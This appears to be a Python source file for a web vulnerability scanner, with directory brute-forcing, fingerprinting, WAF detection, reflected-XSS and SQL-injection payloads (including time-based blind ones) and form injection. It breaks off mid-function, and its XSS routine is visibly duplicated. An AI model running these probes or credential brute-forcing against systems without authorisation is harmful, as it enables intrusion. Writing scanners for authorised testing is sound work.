"""
LightScan v2.0 PHANTOM — Web Application Scanner
Developer: Light (Neok1ra)

Integration of uploaded WebScanner (Doc 4) — all 7 checks preserved + expanded.

Uploaded checks (kept, rewritten async-compatible + LightScan output):
  1. dir_brute          — threaded directory brute, wordlist or wordlist_file
  2. fingerprint_tech   — server, X-Powered-By, cookies, generator meta, JS libs
  3. sqli_test          — error-based SQLi probe on discovered GET params
  4. xss_test           — reflected XSS probe on discovered GET params
  5. cors_test          — CORS origin reflection + credentials header check
  6. default_creds_test — POST brute on common admin panels
  7. jwt_none_test       — JWT alg:none downgrade on discovered tokens

Added in LightScan integration:
  • wordlist_file support (your inline snippet)
  • version extraction from tech fingerprint
  • WAF detection (Cloudflare, ModSecurity, AWS WAF, Akamai, Imperva, F5)
  • Security headers audit (missing HSTS, CSP, X-Frame-Options, etc.)
  • Open redirect probe on discovered GET params
  • Sensitive file check (robots.txt, .git/HEAD, .env, backup.sql, etc.)
  • JS secret scanning (API keys, tokens in inline/external script tags)
  • Form-based login detection for smarter default_creds_test
  • Async run_all_async() wrapper for BruteEngine / PhantomEngine integration
  • Returns list[ScanResult] — plugs directly into reporter / PhantomEngine
"""
from __future__ import annotations

import asyncio
import base64
import json
import queue
import re
import threading
import time
import urllib.parse
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

# bs4 + requests are optional — graceful degradation to urllib
try:
    from bs4 import BeautifulSoup
    _BS4 = True
except ImportError:
    _BS4 = False

try:
    import requests
    _REQUESTS = True
except ImportError:
    _REQUESTS = False

from lightscan.core.engine import ScanResult, Severity

# ── Default wordlists ─────────────────────────────────────────────────────────

DIR_WORDLIST = [
    # Admin panels
    "admin", "login", "wp-admin", "wp-login.php", "administrator",
    "adminpanel", "admin_area", "admin/login", "admin.php", "manager",
    "backend", "administration", "member", "cms/login", "user/login",
    # Dev / exposure
    ".git", ".git/HEAD", ".env", "backup", "config", "db", "database",
    "sql", "dump", "test", "debug", "dev", "staging",
    # Common API
    "api", "api/v1", "api/v2", "v1", "v2", "swagger", "swagger-ui.html",
    "swagger/index.html", "openapi.json", "graphql",
    # Uploads / static
    "uploads", "upload", "images", "img", "files", "static", "assets",
    "css", "js", "vendor", "node_modules",
    # Info disclosure
    "phpinfo.php", "info.php", "test.php", "server-status",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "clientaccesspolicy.xml", ".well-known/security.txt",
    # Backups
    "backup.sql", "dump.sql", "backup.zip", "www.zip",
    "config.bak", "web.config.bak",
]

SENSITIVE_FILES = [
    ".git/HEAD", ".env", ".htaccess", "web.config",
    "backup.sql", "dump.sql", "database.sql",
    "config.php.bak", "wp-config.php.bak",
    "server-status", "server-info",
    ".DS_Store", "Thumbs.db",
    "phpinfo.php", "info.php", "test.php",
    "crossdomain.xml", "clientaccesspolicy.xml",
]

# Error patterns for SQLi detection (your uploaded list + extras)
SQLI_ERRORS = [
    "sql", "mysql", "syntax error", "unclosed quotation",
    "odbc", "driver", "db error", "supplied argument is not a valid",
    "warning: mysql", "ora-", "microsoft ole db",
    "pg_query()", "sqlite3", "postgresql", "invalid query",
    "sqlstate", "you have an error in your sql syntax",
]

# WAF signatures (response headers + body patterns)
WAF_SIGNATURES = {
    "Cloudflare":  {"headers": ["cf-ray", "cf-cache-status"], "body": "cloudflare"},
    "ModSecurity": {"headers": ["mod_security", "x-modsecurity"], "body": "ModSecurity"},
    "AWS WAF":     {"headers": ["x-amzn-requestid"],            "body": "AWS WAF"},
    "Akamai":      {"headers": ["x-akamai-request-id"],         "body": "Reference #"},
    "Imperva":     {"headers": ["x-iinfo"],                     "body": "Incapsula"},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "x-cnection"],     "body": "The requested URL was rejected"},
    "Sucuri":      {"headers": ["x-sucuri-id"],                 "body": "Sucuri WebSite Firewall"},
}

# Security headers that should be present
SEC_HEADERS = {
    "Strict-Transport-Security": "HSTS missing — HTTPS downgrade possible",
    "Content-Security-Policy":   "CSP missing — XSS risk elevated",
    "X-Frame-Options":           "Clickjacking protection missing",
    "X-Content-Type-Options":    "MIME sniffing protection missing",
    "Referrer-Policy":           "Referrer leakage possible",
    "Permissions-Policy":        "Feature policy not set",
}

# JS secret patterns (inline scripts + .js files)
JS_SECRET_PATTERNS = [
    (r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})',  "API_KEY"),
    (r'(?:secret|client_secret)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})', "SECRET"),
    (r'(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\']{6,})',            "PASSWORD"),
    (r'(?:token|access_token|auth_token)\s*[=:]\s*["\']([A-Za-z0-9_.\-]{20,})', "TOKEN"),
    (r'(?:aws_access_key_id|AKIA)[A-Z0-9]{16}',                        "AWS_KEY"),
    (r'(?:firebase|firebaseapp)\s*[=:]\s*["\']([^"\']{10,})',          "FIREBASE"),
    (r'AIza[0-9A-Za-z\-_]{35}',                                        "GOOGLE_API_KEY"),
]


# ── Core WebScanner class ─────────────────────────────────────────────────────

class WebScanner:
    """
    Full web application scanner — your uploaded WebScanner + LightScan additions.
    Uses requests if available, falls back to urllib.
    """

    def __init__(self, base_url: str, timeout: float = 8.0,
                 threads: int = 10, verify_ssl: bool = False,
                 proxy: str | None = None):
        self.base_url = base_url.rstrip("/")
        self.timeout  = timeout
        self.threads  = threads
        self._results_lock = threading.Lock()

        # ── Session setup (requests preferred, urllib fallback)
        if _REQUESTS:
            import requests as req
            self.session = req.Session()
            self.session.verify = verify_ssl
            self.session.headers["User-Agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            )
            if proxy:
                self.session.proxies = {"http": proxy, "https": proxy}
            self._use_requests = True
        else:
            self.session = None
            self._use_requests = False

        # Result buckets — your original dict + new ones
        self.results: dict = {
            "directories":    [],
            "tech":           {},
            "sqli":           [],
            "sqli_post":      [],
            "sqli_blind":     [],   # boolean + time-based blind
            "sqli_union":     [],   # UNION-based
            "xss":            [],
            "xss_stored":     [],   # stored XSS: POST then re-fetch
            "xss_dom":        [],   # static JS source/sink analysis
            "ssti":           [],
            "lfi":            [],
            "lfi_rfi":        [],   # Remote File Inclusion
            "ssrf":           [],
            "xxe":            [],
            "open_redirect":  [],
            "cors":           None,
            "cors_advanced":  [],
            "csrf":           [],   # missing CSRF tokens + unprotected state-change
            "clickjacking":   {},   # X-Frame-Options + CSP frame-ancestors
            "crlf":           [],   # HTTP Response Splitting / CRLF injection
            "idor":           [],   # Insecure Direct Object Reference (API ID enum)
            "file_upload":    [],   # upload bypass: MIME, extension, magic bytes
            "deserialization":[],   # Java/PHP/Python deser gadget probes
            "prototype_poll": [],   # JS prototype pollution via __proto__
            "websocket":      [],   # WebSocket endpoint detection + origin check
            "oauth":          {},   # OAuth 2.0 endpoint + state/redirect_uri check
            "cookie_flags":   [],   # missing HttpOnly/Secure/SameSite
            "error_disclosure":[],  # stack traces, DB errors, debug pages
            "default_creds":  [],
            "jwt_none":       None,
            "jwt_advanced":   [],
            "waf":            None,
            "waf_bypass":     [],
            "sec_headers":    {},
            "sensitive_files":[],
            "js_secrets":     [],
            "sqli_error":     [],
            "cms":            {},
            "cms_plugins":    [],
            "api_endpoints":  [],
            "graphql":        {},
            "http_methods":   {},
            "param_pollution":[],
            "host_header":    [],
            "smuggling":      {},
            "rate_limit":     {},
            "subdomains":     [],
            "cache_poison":   [],
            "ssl_tls":        {},   # cert expiry, weak protocols, cipher strength
        }

    # ── HTTP primitives ───────────────────────────────────────────────────────

    def _get(self, path: str, headers: dict | None = None,
             allow_redirects: bool = True, **kwargs):
        """Safe GET — your _get() from uploaded code, extended."""
        try:
            url = urllib.parse.urljoin(self.base_url + "/", path.lstrip("/"))
            if self._use_requests:
                return self.session.get(
                    url, timeout=self.timeout,
                    headers=headers or {},
                    allow_redirects=allow_redirects,
                    verify=False, **kwargs)
            else:
                req = urllib.request.Request(url)
                req.add_header("User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                if headers:
                    for k, v in headers.items():
                        req.add_header(k, v)
                ctx = __import__("ssl").create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = 0
                with urllib.request.urlopen(req, timeout=self.timeout,
                                            context=ctx) as r:
                    r._text = r.read(65536).decode("utf-8", errors="replace")
                    r._status = r.status
                    return r
        except Exception:
            return None

    def _post(self, path: str, data: dict, allow_redirects: bool = False):
        """Safe POST."""
        try:
            url = urllib.parse.urljoin(self.base_url + "/", path.lstrip("/"))
            if self._use_requests:
                return self.session.post(
                    url, data=data, timeout=self.timeout,
                    allow_redirects=allow_redirects, verify=False)
            else:
                enc = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(url, data=enc, method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
                req.add_header("User-Agent", "Mozilla/5.0")
                ctx = __import__("ssl").create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = 0
                with urllib.request.urlopen(req, timeout=self.timeout,
                                            context=ctx) as r:
                    r._status = r.status; return r
        except Exception:
            return None

    def _text(self, resp) -> str:
        """Extract body text regardless of response type."""
        if resp is None: return ""
        if hasattr(resp, "text"): return resp.text
        if hasattr(resp, "_text"): return resp._text
        return ""

    def _status(self, resp) -> int:
        if resp is None: return 0
        if hasattr(resp, "status_code"): return resp.status_code
        if hasattr(resp, "_status"):     return resp._status
        return 0

    def _headers(self, resp) -> dict:
        if resp is None: return {}
        if hasattr(resp, "headers"): return dict(resp.headers)
        return {}

    def _parse_html(self, text: str):
        """Parse HTML — bs4 if available, else lightweight regex fallback."""
        if _BS4:
            return BeautifulSoup(text, "html.parser")
        return None

    # ── 1. Directory Brute Force ──────────────────────────────────────────────


    def dir_brute(self, wordlist: list | None = None,
                  wordlist_file: str | None = None) -> list[dict]:
        """Threaded directory brute — pre-flight check, retries, progress."""
        if wordlist_file:
            try:
                with open(wordlist_file, "r", errors="replace") as f:
                    wordlist = [l.strip() for l in f
                                if l.strip() and not l.startswith("#")]
                print(f"\033[38;5;240m[dir] wordlist: {wordlist_file} "
                      f"({len(wordlist)} paths)\033[0m")
            except FileNotFoundError:
                print(f"\033[38;5;196m[!] {wordlist_file} not found — using default\033[0m")
                wordlist = None

        if wordlist is None:
            wordlist = DIR_WORDLIST

        # ── Pre-flight: confirm host is reachable before spawning threads ────
        print(f"\033[38;5;240m[dir] pre-flight check → {self.base_url}\033[0m",
              flush=True)
        preflight_ok = False
        for attempt in range(3):
            try:
                if self._use_requests:
                    r = self.session.get(self.base_url + "/",
                                         timeout=(5, 10), verify=False,
                                         allow_redirects=True)
                    preflight_ok = True
                    print(f"\033[38;5;240m[dir] host reachable "
                          f"[{r.status_code}] "
                          f"({len(r.content)} bytes)\033[0m", flush=True)
                    break
                else:
                    preflight_ok = True; break
            except Exception as e:
                print(f"\033[38;5;196m[dir] attempt {attempt+1}/3 failed: "
                      f"{type(e).__name__}: {str(e)[:80]}\033[0m", flush=True)
                time.sleep(2)

        if not preflight_ok:
            print(f"\033[38;5;196m[dir] host unreachable — skipping brute\033[0m")
            self.results["directories"] = []
            return []

        total         = len(wordlist)
        found:        list[dict] = []
        errors:       list[str]  = []
        counter       = [0]
        stop          = threading.Event()
        brute_timeout = min(self.timeout, 8.0)   # single float — more reliable than tuple

        q = queue.Queue()
        for w in wordlist:
            q.put(w)

        print(f"\033[38;5;240m[dir] {total} paths · {self.threads} threads "
              f"· {brute_timeout:.0f}s/req\033[0m", flush=True)

        def worker():
            while not stop.is_set():
                try:
                    path = q.get_nowait()
                except queue.Empty:
                    break

                # print progress before making the request
                with self._results_lock:
                    counter[0] += 1
                    n = counter[0]
                    if n == 1 or n % 10 == 0 or n == total:
                        print(f"\033[38;5;240m  [{n}/{total}] "
                              f"/{path[:40]}\033[0m", flush=True)

                sc = 0
                try:
                    url = urllib.parse.urljoin(
                        self.base_url + "/", path.lstrip("/"))
                    if self._use_requests:
                        resp = self.session.get(
                            url,
                            timeout=brute_timeout,
                            headers={},
                            allow_redirects=False,
                            verify=False)
                    else:
                        resp = self._get(path, allow_redirects=False)
                    sc = self._status(resp)
                except Exception as e:
                    err = f"/{path}: {type(e).__name__}"
                    with self._results_lock:
                        errors.append(err)

                if sc and sc < 400:
                    item = {"path": path, "status": sc}
                    try:
                        hdrs = self._headers(resp)
                        if sc in (301,302,307,308) and "Location" in hdrs:
                            item["redirect"] = hdrs["Location"]
                    except Exception:
                        pass
                    with self._results_lock:
                        found.append(item)
                    print(f"  \033[38;5;196m[{sc}]\033[0m /{path}", flush=True)

                q.task_done()

        t_list = []
        try:
            for _ in range(min(self.threads, total)):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                t_list.append(t)
            for t in t_list:
                t.join()
        except KeyboardInterrupt:
            stop.set()
            print(f"\n\033[38;5;196m[dir] interrupted — "
                  f"{len(found)} found\033[0m")

        if errors:
            unique_types = list({e.split(": ")[-1] for e in errors})
            print(f"\033[38;5;196m[dir] {len(errors)} errors "
                  f"({', '.join(unique_types[:3])})\033[0m")

        print(f"\033[38;5;240m[dir] done — {len(found)}/{total} found\033[0m",
              flush=True)
        self.results["directories"] = found
        return found


    def fingerprint_tech(self) -> dict:
        """
        Your uploaded fingerprint_tech() + version extraction + WAF detection
        + security headers audit.
        """
        resp = self._get("/")
        if not resp:
            return {}

        tech: dict = {}
        headers = self._headers(resp)
        text    = self._text(resp)

        # ── Your uploaded header checks ──────────────────────────────────────
        if "Server" in headers:
            tech["server"] = headers["Server"]
        if "X-Powered-By" in headers:
            tech["powered_by"] = headers["X-Powered-By"]

        # Cookie-based backend detection (your uploaded logic)
        cookie_str = headers.get("Set-Cookie", "")
        if "PHPSESSID"   in cookie_str: tech["backend"] = "PHP"
        if "JSESSIONID"  in cookie_str: tech["backend"] = "Java/Tomcat"
        if "ASP.NET"     in cookie_str: tech["backend"] = "ASP.NET"
        if "ASPSESSIONID"in cookie_str: tech["backend"] = "ASP.NET"
        if "rack.session"in cookie_str: tech["backend"] = "Ruby/Rack"
        if "laravel_session" in cookie_str: tech["backend"] = "PHP/Laravel"
        if "django"      in cookie_str.lower(): tech["backend"] = "Python/Django"

        # ── HTML analysis (your uploaded logic + version extraction) ─────────
        soup = self._parse_html(text)
        if soup:
            gen = soup.find("meta", attrs={"name": "generator"})
            if gen and gen.get("content"):
                tech["generator"] = gen["content"]

            # WordPress version from meta generator
            wp_m = re.search(r"WordPress\s+([\d.]+)", gen["content"] if gen else "")
            if wp_m: tech["cms_version"] = f"WordPress {wp_m.group(1)}"

            # JS libraries — your uploaded script scan + extras
            for s in soup.find_all("script", src=True):
                src = s["src"].lower()
                if "jquery"    in src:
                    v = re.search(r"jquery[.-]([\d.]+)", src)
                    tech["js_jquery"]    = v.group(1) if v else "detected"
                if "bootstrap"  in src:
                    v = re.search(r"bootstrap[.-]([\d.]+)", src)
                    tech["js_bootstrap"] = v.group(1) if v else "detected"
                if "react"      in src: tech["js_react"]   = "detected"
                if "angular"    in src: tech["js_angular"]  = "detected"
                if "vue"        in src: tech["js_vue"]      = "detected"
                if "next"       in src: tech["js_nextjs"]   = "detected"
                if "nuxt"       in src: tech["js_nuxt"]     = "detected"
                if "svelte"     in src: tech["js_svelte"]   = "detected"
                if "lodash"     in src: tech["js_lodash"]   = "detected"
                if "axios"      in src: tech["js_axios"]    = "detected"

        # ── Server version extraction ─────────────────────────────────────────
        for header_name in ("Server", "X-Powered-By", "Via", "X-AspNet-Version"):
            if header_name in headers:
                tech[f"header_{header_name.lower().replace('-','_')}"] = headers[header_name]

        # ── WAF detection ─────────────────────────────────────────────────────
        waf_probe_resp = self._get("/?<script>alert(1)</script>")
        waf_text    = self._text(waf_probe_resp).lower()
        waf_headers = self._headers(waf_probe_resp)
        waf_status  = self._status(waf_probe_resp)

        waf_detected = None
        for waf_name, sig in WAF_SIGNATURES.items():
            header_hit = any(h.lower() in {k.lower() for k in waf_headers}
                             for h in sig["headers"])
            body_hit   = sig["body"].lower() in waf_text
            if header_hit or body_hit or waf_status in (403, 406, 429, 503):
                if header_hit or body_hit:
                    waf_detected = waf_name
                    break
        # Fallback: status 403 on probe = possible WAF
        if not waf_detected and waf_status in (403, 406):
            waf_detected = f"Unknown (probe returned {waf_status})"
        tech["waf"] = waf_detected or "None detected"
        self.results["waf"] = waf_detected

        # ── Security headers audit ────────────────────────────────────────────
        missing_sec = {}
        for hdr, msg in SEC_HEADERS.items():
            if hdr not in headers:
                missing_sec[hdr] = msg
        self.results["sec_headers"] = missing_sec
        if missing_sec:
            tech["missing_security_headers"] = list(missing_sec.keys())

        self.results["tech"] = tech
        return tech

    # ── 3. SQLi (error-based) ─────────────────────────────────────────────────

    def sqli_test(self) -> list[dict]:
        """Your uploaded sqli_test() — error pattern detection on GET params."""
        urls = self._collect_param_urls()
        payload = "'"
        vulnerable: list[dict] = []

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            for key in params:
                test_params = params.copy()
                test_params[key] = payload
                try:
                    resp = self._get(parsed.path + "?" +
                                     urllib.parse.urlencode(test_params))
                    content = self._text(resp).lower()
                    for pattern in SQLI_ERRORS:
                        if pattern in content:
                            vulnerable.append({
                                "url":       url,
                                "parameter": key,
                                "type":      "error-based",
                                "pattern":   pattern,
                            })
                            print(f"  \033[38;5;196m[SQLi]\033[0m {url} param={key}")
                            break
                except Exception:
                    continue

        self.results["sqli"] = vulnerable
        return vulnerable

    # ── 4. XSS (reflected) — expanded payloads (your uploaded snippet) ───────

    def xss_test(self, payloads: list | None = None) -> list[dict]:
        """
        Your uploaded xss_test() with payloads param — 7 payload variants,
        stops at first hit per param (your uploaded break logic).
        """
        if payloads is None:
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
                "';alert(1)//",
                "<iframe src=javascript:alert(1)>",
                "'><svg/onload=alert(1)>",
            ]

        urls = self._collect_param_urls()
        vulnerable: list[dict] = []
        seen:       set = set()
        # track per-param hit count for grouped console output
        param_hits: dict = {}

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            for key in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[key] = payload
                    try:
                        resp = self._get(
                            parsed.path + "?" + urllib.parse.urlencode(test_params))
                        text = self._text(resp)
                        if payload in text:
                            ident = f"{url}:{key}"
                            if ident not in seen:
                                seen.add(ident)
                                vulnerable.append({
                                    "url":       url,
                                    "parameter": key,
                                    "payload":   payload,
                                })
                                param_key = f"{parsed.netloc}:{key}"
                                param_hits[param_key] = param_hits.get(param_key, 0) + 1
                                if param_hits[param_key] == 1:
                                    # First hit on this param — print it
                                    print(f"  \033[38;5;196m[XSS]\033[0m "
                                          f"param={key} payload={payload[:30]} "
                                          f"→ {url}", flush=True)
                                # subsequent hits: silent, counted
                            break
                    except Exception:
                        continue

        # Summary line for params with multiple hits
        for param_key, count in param_hits.items():
            if count > 1:
                param = param_key.split(":",1)[-1]
                print(f"  \033[38;5;196m[XSS]\033[0m "
                      f"param={param} ×{count} URLs vulnerable", flush=True)


            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            for key in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[key] = payload
                    try:
                        resp = self._get(
                            parsed.path + "?" + urllib.parse.urlencode(test_params))
                        text = self._text(resp)
                        if payload in text:
                            ident = f"{url}:{key}"
                            if ident not in seen:
                                seen.add(ident)
                                vulnerable.append({
                                    "url":       url,
                                    "parameter": key,
                                    "payload":   payload,
                                })
                                param_key = f"{parsed.netloc}:{key}"
                                if param_key not in param_hits:
                                    # First hit — print full detail
                                    param_hits[param_key] = 1
                                    print(f"  \033[38;5;196m[XSS]\033[0m "
                                          f"{url} param={key} payload={payload[:30]}")
                                else:
                                    # Subsequent hits — overwrite counter line
                                    param_hits[param_key] += 1
                                    print(f"  \033[38;5;196m[XSS]\033[0m "
                                          f"param={key} ×{param_hits[param_key]} hits "
                                          f"(last: ...{url[-35:]})",
                                          end="\r", flush=True)
                            break
                    except Exception:
                        continue

        # Final newline to clear \r line if any
        if any(v > 1 for v in param_hits.values()):
            total = sum(1 for v in param_hits.values() if v > 1)
            print(f"  \033[38;5;196m[XSS]\033[0m "
                  f"{len(vulnerable)} reflections across {len(param_hits)} param(s)    ")

        self.results["xss"] = vulnerable
        return vulnerable

    # ── 4b. SQLi POST (form-based) — your uploaded sqli_post_test() ─────────

    def sqli_post_test(self) -> list[dict]:
        """
        Your uploaded sqli_post_test() — finds <form> elements on every
        discovered page, injects payload into all fields, checks response
        for SQL error patterns.  GET forms tested too (your comment).
        """
        # Pages to crawl for forms: homepage + every discovered directory
        pages_to_crawl = ["/"]
        for item in self.results.get("directories", []):
            pages_to_crawl.append("/" + item["path"].lstrip("/"))

        payload      = "'"
        vulnerable: list[dict] = []
        seen: set    = set()

        for page in pages_to_crawl:
            resp = self._get(page)
            if not resp: continue
            soup = self._parse_html(self._text(resp))
            if not soup: continue

            for form in soup.find_all("form"):
                action = form.get("action") or page
                method = (form.get("method") or "get").lower()
                url    = urllib.parse.urljoin(self.base_url + "/",
                                              action.lstrip("/"))

                # Build data dict — inject payload into every named field
                data: dict = {}
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if not name: continue
                    itype = (inp.get("type") or "text").lower()
                    # Keep hidden/submit values as-is, inject into text fields
                    if itype in ("hidden", "submit", "button", "image"):
                        data[name] = inp.get("value", "")
                    else:
                        data[name] = payload

                if not data: continue
                ident = f"{url}:{method}:{','.join(sorted(data.keys()))}"
                if ident in seen: continue
                seen.add(ident)

                try:
                    if method == "post":
                        resp2 = self._post(url, data, allow_redirects=True)
                    else:
                        # GET form — append as query string
                        qs    = urllib.parse.urlencode(data)
                        resp2 = self._get(url.split("?")[0] + "?" + qs)

                    content = self._text(resp2).lower()
                    for pattern in SQLI_ERRORS:
                        if pattern in content:
                            entry = {
                                "url":    url,
                                "method": method.upper(),
                                "fields": list(data.keys()),
                                "pattern": pattern,
                            }
                            vulnerable.append(entry)
                            print(f"  \033[38;5;196m[SQLi-POST]\033[0m "
                                  f"{method.upper()} {url} fields={list(data.keys())}")
                            break
                except Exception:
                    continue

        self.results["sqli_post"] = vulnerable
        return vulnerable

    # ── 5b. CMS Detection — your uploaded detect_cms() ───────────────────────

    def detect_cms(self) -> dict:
        """
        Your uploaded detect_cms() — WordPress, Joomla, Drupal + 8 more:
        Magento, OpenCart, PrestaShop, TYPO3, Laravel, Django, Flask, Ghost.
        Version extracted where possible via meta tags, manifest files, or
        changelog/readme probes.
        """
        resp = self._get("/")
        if not resp:
            return {}

        text = self._text(resp)
        soup = self._parse_html(text)
        cms: dict = {}

        # ── WordPress (your uploaded logic) ──────────────────────────────────
        if not cms and soup:
            gen = soup.find("meta", attrs={"name": "generator"})
            if gen and "wordpress" in (gen.get("content") or "").lower():
                cms["name"] = "WordPress"
                m = re.search(r"WordPress\s+([\d.]+)", gen["content"], re.I)
                if m:
                    cms["version"] = m.group(1)
                else:
                    # your uploaded fallback: readme.html
                    readme = self._get("/readme.html")
                    if self._status(readme) == 200:
                        m2 = re.search(r"<h1.*?WordPress.*?([\d.]+)",
                                       self._text(readme), re.I)
                        if m2: cms["version"] = m2.group(1)
                # Extra WP signals
                if "wp-content" in text: cms["confidence"] = "HIGH"

        # wp-json REST API probe (version without meta)
        if not cms:
            wj = self._get("/wp-json/")
            if self._status(wj) == 200 and "wp/v2" in self._text(wj):
                cms["name"] = "WordPress"
                m = re.search(r'"version"\s*:\s*"([\d.]+)"', self._text(wj))
                if m: cms["version"] = m.group(1)

        # ── Joomla (your uploaded logic) ─────────────────────────────────────
        if not cms:
            adm = self._get("/administrator/")
            if self._status(adm) == 200:
                cms["name"] = "Joomla"
                # your uploaded: manifest file for version
                mf = self._get("/administrator/manifests/files/joomla.xml")
                if self._status(mf) == 200:
                    m = re.search(r"<version>(.*?)</version>",
                                  self._text(mf), re.I)
                    if m: cms["version"] = m.group(1)

        # ── Drupal (your uploaded logic) ─────────────────────────────────────
        if not cms and soup:
            dm = soup.find("meta", attrs={"name": "Generator"})
            if dm and "drupal" in (dm.get("content") or "").lower():
                cms["name"] = "Drupal"
                m = re.search(r"Drupal\s+([\d.]+)", dm.get("content",""), re.I)
                if m: cms["version"] = m.group(1)

        if not cms and "drupal" in text.lower() and "sites/default/files" in text:
            cms["name"] = "Drupal"

        # ── Magento ───────────────────────────────────────────────────────────
        if not cms:
            mg = self._get("/magento_version")
            if self._status(mg) == 200:
                cms["name"] = "Magento"
                m = re.search(r"([\d.]+)", self._text(mg))
                if m: cms["version"] = m.group(1)
            elif "Mage.Cookies" in text or "MAGE_" in text:
                cms["name"] = "Magento"

        # ── OpenCart ─────────────────────────────────────────────────────────
        if not cms and ("catalog/view/theme" in text or
                        "route=common/home" in text):
            cms["name"] = "OpenCart"
            ch = self._get("/CHANGELOG.md")
            if self._status(ch) == 200:
                m = re.search(r"([\d.]+\.[\d.]+)", self._text(ch))
                if m: cms["version"] = m.group(1)

        # ── PrestaShop ────────────────────────────────────────────────────────
        if not cms and ("prestashop" in text.lower() or
                        "/modules/ps_" in text):
            cms["name"] = "PrestaShop"
            cl = self._get("/CHANGELOG")
            if self._status(cl) == 200:
                m = re.search(r"PrestaShop\s+([\d.]+)", self._text(cl), re.I)
                if m: cms["version"] = m.group(1)

        # ── TYPO3 ─────────────────────────────────────────────────────────────
        if not cms and ("typo3" in text.lower() or
                        "/typo3conf/" in text):
            cms["name"] = "TYPO3"
            cl = self._get("/typo3/sysext/core/CHANGELOG")
            if self._status(cl) == 200:
                m = re.search(r"([\d]+\.\d+\.\d+)", self._text(cl))
                if m: cms["version"] = m.group(1)

        # ── Laravel ───────────────────────────────────────────────────────────
        if not cms:
            hdrs = self._headers(resp)
            cookie = hdrs.get("Set-Cookie", "")
            if "laravel_session" in cookie or "XSRF-TOKEN" in cookie:
                cms["name"] = "Laravel"
                # version from /vendor/laravel/framework/CHANGELOG.md (if exposed)
                ch = self._get("/vendor/laravel/framework/CHANGELOG.md")
                if self._status(ch) == 200:
                    m = re.search(r"## v?([\d.]+)", self._text(ch))
                    if m: cms["version"] = m.group(1)

        # ── Django ────────────────────────────────────────────────────────────
        if not cms:
            hdrs = self._headers(resp)
            if "django" in hdrs.get("X-Powered-By","").lower() or \
               "csrfmiddlewaretoken" in text:
                cms["name"] = "Django"

        # ── Flask ─────────────────────────────────────────────────────────────
        if not cms:
            hdrs = self._headers(resp)
            server = hdrs.get("Server", "")
            if "werkzeug" in server.lower():
                cms["name"] = "Flask/Werkzeug"
                m = re.search(r"Werkzeug/([\d.]+)", server, re.I)
                if m: cms["version"] = m.group(1)

        # ── Ghost ─────────────────────────────────────────────────────────────
        if not cms and soup:
            gen = soup.find("meta", attrs={"name": "generator"})
            if gen and "ghost" in (gen.get("content") or "").lower():
                cms["name"] = "Ghost"
                m = re.search(r"Ghost\s+([\d.]+)", gen.get("content",""), re.I)
                if m: cms["version"] = m.group(1)

        if cms:
            print(f"  \033[38;5;196m[CMS]\033[0m "
                  f"{cms.get('name','?')} {cms.get('version','(version unknown)')}")

        self.results["cms"] = cms
        return cms

        self.results["cms"] = cms
        return cms

    # ══════════════════════════════════════════════════════════════════════════
    # ADVANCED CHECKS
    # ══════════════════════════════════════════════════════════════════════════

    # ── Blind SQLi (Boolean + Time-based) ────────────────────────────────────

    def sqli_blind_test(self) -> list[dict]:
        """
        Boolean-based: inject true/false conditions, compare response length.
        Time-based: SLEEP()/pg_sleep()/WAITFOR DELAY — measures actual delay.
        Covers MySQL, PostgreSQL, MSSQL, SQLite, Oracle.
        """
        BOOL_PAIRS = [
            ("1 AND 1=1--",   "1 AND 1=2--"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1 AND 1=1",     "1 AND 1=2"),
        ]
        TIME_PAYLOADS = [
            ("' AND SLEEP(3)--",              3.0, "MySQL"),
            ("'; WAITFOR DELAY '0:0:3'--",    3.0, "MSSQL"),
            ("' AND pg_sleep(3)--",           3.0, "PostgreSQL"),
            ("' AND RANDOMBLOB(100000000)--", 2.0, "SQLite"),
            ("1 OR SLEEP(3)--",               3.0, "MySQL-OR"),
        ]
        urls = self._collect_param_urls()
        vulnerable: list[dict] = []
        seen: set = set()

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            base_resp = self._get(parsed.path + "?" + urllib.parse.urlencode(params))
            base_len  = len(self._text(base_resp))
            if base_len == 0:
                continue

            for key in params:
                # Boolean
                for true_p, false_p in BOOL_PAIRS:
                    try:
                        tp = params.copy(); tp[key] = true_p
                        fp = params.copy(); fp[key] = false_p
                        rt = self._get(parsed.path + "?" + urllib.parse.urlencode(tp))
                        rf = self._get(parsed.path + "?" + urllib.parse.urlencode(fp))
                        tl = len(self._text(rt)); fl = len(self._text(rf))
                        if tl > 0 and fl > 0 and abs(tl - fl) > 50:
                            ident = f"bool:{url}:{key}"
                            if ident not in seen:
                                seen.add(ident)
                                entry = {"url": url, "parameter": key,
                                         "type": "boolean-blind",
                                         "true_len": tl, "false_len": fl}
                                vulnerable.append(entry)
                                print(f"  \033[38;5;196m[SQLI-BLIND-BOOL]\033[0m "
                                      f"{url} param={key} Δlen={abs(tl-fl)}")
                            break
                    except Exception:
                        continue

                # Time-based
                for payload, threshold, db in TIME_PAYLOADS:
                    tp = params.copy(); tp[key] = payload
                    t0 = time.time()
